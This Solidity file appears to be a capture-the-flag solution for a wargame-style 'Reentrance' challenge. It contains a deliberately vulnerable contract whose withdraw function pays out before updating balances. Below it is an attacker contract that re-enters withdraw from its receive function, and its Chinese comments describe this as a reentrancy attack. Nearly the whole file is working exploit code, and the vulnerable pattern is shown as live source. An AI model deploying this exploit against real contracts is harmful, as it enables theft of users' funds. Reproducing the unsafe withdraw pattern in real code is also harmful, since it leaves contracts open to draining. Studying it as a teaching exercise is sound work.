// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.1.0/contracts/math/SafeMath.sol";
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Reentrancea {
    function a(Reentrance _add) external payable {
      _add.donate{value : msg.value}(address(this));
      //调用目标合约donate函数转入；
      _add.withdraw(msg.value);
      //调用目标合约withdraw函数转出；
    }

    receive() external payable {
        //接收ETH时会触发receive，在receive写入withdraw，两次调用withdraw，实现重入攻击；
        Reentrance _add = Reentrance(msg.sender);
        if(address(_add).balance >= msg.value) {
            _add.withdraw(msg.value);
        }
    }
}